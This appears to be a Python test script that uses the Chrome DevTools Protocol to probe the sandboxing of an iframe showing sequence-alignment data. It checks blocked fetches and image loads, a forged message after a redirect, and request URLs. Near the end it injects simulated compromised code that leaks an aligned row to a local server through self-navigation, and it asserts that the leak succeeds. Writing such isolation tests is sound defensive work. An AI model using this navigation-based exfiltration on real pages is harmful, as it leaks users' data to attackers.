import asyncio, json, urllib.request, websockets

async def main():
    page = next(t for t in json.load(urllib.request.urlopen('http://127.0.0.1:19231/json')) if t['type']=='page')
    async with websockets.connect(page['webSocketDebuggerUrl'], max_size=20_000_000) as ws:
        seq = 0
        events = []
        async def call(method, params=None):
            nonlocal seq
            seq += 1; ident = seq
            await ws.send(json.dumps({'id':ident,'method':method,'params':params or {}}))
            while True:
                msg=json.loads(await ws.recv())
                if msg.get('id')==ident:
                    if 'error' in msg: raise RuntimeError(msg)
                    return msg['result']
                events.append(msg)
        async def ev(expr, context=None, await_promise=False):
            p={'expression':expr,'returnByValue':True,'awaitPromise':await_promise}
            if context: p['contextId']=context
            result=await call('Runtime.evaluate',p)
            if 'exceptionDetails' in result: raise RuntimeError(result['exceptionDetails'])
            return result['result'].get('value')
        await call('Page.enable'); await call('Network.enable'); await call('Runtime.enable')
        await call('Page.reload',{'ignoreCache':True})
        await asyncio.sleep(4)
        targets=json.load(urllib.request.urlopen('http://127.0.0.1:19231/json'))
        child=next(t for t in targets if t['type']=='iframe' and t['parentId']==page['id'])
        async with websockets.connect(child['webSocketDebuggerUrl'], max_size=20_000_000) as childws:
            child_events=[]
            await childws.send(json.dumps({'id':2,'method':'Network.enable'}))
            while json.loads(await childws.recv()).get('id') != 2: pass
            async def child_ev(expr, await_promise=False):
                await childws.send(json.dumps({'id':1,'method':'Runtime.evaluate','params':{'expression':expr,'returnByValue':True,'awaitPromise':await_promise}}))
                while True:
                    msg=json.loads(await childws.recv())
                    if msg.get('id')==1: return msg['result']['result'].get('value')
                    child_events.append(msg)
            canvases=await child_ev('document.querySelectorAll("canvas").length')
            print('canvases',canvases); assert canvases > 0
            blocked=await child_ev("fetch('http://127.0.0.1:43731/probe-outbound').then(()=>false,()=>true)",True)
            print('fetch blocked',blocked); assert blocked
            image=await child_ev("new Promise(r=>{let i=new Image(); i.onload=()=>r('loaded'); i.onerror=()=>r('blocked'); i.src='http://127.0.0.1:43731/probe-image'})",True)
            print('image',image); assert image=='blocked'
            print('child network events',[(e.get('method'),e.get('params',{}).get('blockedReason')) for e in child_events if e.get('method','').startswith('Network.')])
        box=await ev('(()=>{const r=document.querySelector("iframe").getBoundingClientRect();return [r.x,r.y]})()')
        found=None
        for y in (65,75,85,95,105,115,125):
            for x in (82,92,102,112,122):
                for typ in ('mousePressed','mouseReleased'):
                    await call('Input.dispatchMouseEvent',{'type':typ,'x':box[0]+x,'y':box[1]+y,'button':'left','clickCount':1})
                await asyncio.sleep(.05)
                found=await ev('document.querySelector("#selected").textContent')
                if found!='null': break
            if found!='null': break
        print('selected',found); assert found!='null'
        # Force a navigation through an HTTP redirect, then a forged message from
        # the replacement document. The host must never send the alignment.
        await ev("window.leaks=[];window.addEventListener('message',e=>{if(e.data?.probe)leaks.push(e.data)});let f=document.querySelector('iframe');f.removeAttribute('srcdoc');f.src='http://127.0.0.1:43732/redirect';")
        await asyncio.sleep(2)
        before=await ev('document.querySelector("#selected").textContent')
        # replacement itself posts synthetic spoof and reports any incoming message
        await asyncio.sleep(1)
        leaks=await ev('window.leaks')
        print('replacement leaks',leaks,'selection',before)
        assert leaks==[{'probe':'replacement-ready'}] and before==found
        requests=[e['params']['request']['url'] for e in events if e.get('method')=='Network.requestWillBeSent']
        print('network requests',requests)
        assert not any('ACGT' in u or 'A-GT' in u for u in requests)
        # Deliberately emulate compromised code inside a fresh original frame.
        # A local HTTP server observes whether self-navigation can carry rows.
        await call('Page.reload', {'ignoreCache': True}); await asyncio.sleep(4)
        targets=json.load(urllib.request.urlopen('http://127.0.0.1:19231/json'))
        child=next(t for t in targets if t['type']=='iframe' and t['parentId']==page['id'])
        async with websockets.connect(child['webSocketDebuggerUrl'], max_size=20_000_000) as childws:
            expr="location.href='http://127.0.0.1:43732/leak?row='+encodeURIComponent(JSON.parse(document.querySelector('#payload').textContent).rows[0].aligned)"
            await childws.send(json.dumps({'id':3,'method':'Runtime.evaluate','params':{'expression':expr}}))
            await asyncio.sleep(1)
        observed=urllib.request.urlopen('http://127.0.0.1:43732/seen').read().decode()
        print('compromised-script self-navigation observed',observed)
        assert '/leak?row=ACGT' in observed
asyncio.run(main())
